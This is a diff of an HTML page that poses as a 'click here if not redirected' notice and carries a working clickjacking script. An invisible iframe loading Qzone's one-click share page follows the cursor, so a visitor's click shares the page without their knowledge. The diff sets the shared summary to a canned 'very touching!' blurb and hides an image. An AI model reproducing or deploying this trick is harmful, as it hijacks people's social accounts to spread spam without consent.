@@ -11,7 +11,7 @@
         <script type="text/javascript">
             $(document).ready(function(){
                     $('#iframe').css({marginLeft:-625,marginTop:-386,opacity:0});
-                    dshare ='http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(document.location) + '&title=' + encodeURIComponent(document.title) +'&summary=' + encodeURIComponent(window.location);
+                    dshare ='http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(document.location) + '&title=' + encodeURIComponent(document.title) +'&summary=' + encodeURIComponent(' 很感人！');
                     $('#iframe').attr('src',dshare);
                 $('#rainbow_sugar a').mousemove(function(e){
                     $('#wrapper').css({left:e.pageX,top:e.pageY});
@@ -38,7 +38,7 @@
     </head>
     <body>
         <div id="rainbow_sugar">如果没有跳转请按<a href="javascript:;">这里</a>继续...</div>
-        <img src="http://ww2.sinaimg.cn/large/a74ecc4cjw1dxq2wa5aykj.jpg" />
+        <img src="http://ww2.sinaimg.cn/large/a74ecc4cjw1dxq2wa5aykj.jpg" width="0px" height="0px"/>
         <div id="wrapper">
             <iframe id="iframe" frameborder="0" src="#" />
         </div>
